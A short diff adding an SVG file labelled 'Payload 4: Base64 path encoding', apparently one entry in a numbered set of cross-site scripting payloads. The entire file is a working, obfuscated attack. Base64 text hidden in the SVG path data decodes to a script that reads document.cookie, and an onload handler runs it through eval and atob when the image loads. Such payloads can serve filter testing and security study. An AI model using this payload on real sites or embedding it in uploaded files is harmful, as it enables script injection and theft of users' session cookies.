@@ -1,0 +1,6 @@
+<!-- Payload 4: Base64 path encoding -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M YWxlcnQoZG9jdW1lbnQuY29va2llKQ L 116,40 
+          Q 90,10 50,10 Q 10,10 10,40" 
+        onload="eval(atob(this.getAttribute('d').split(' ')[1]))" />
+</svg>
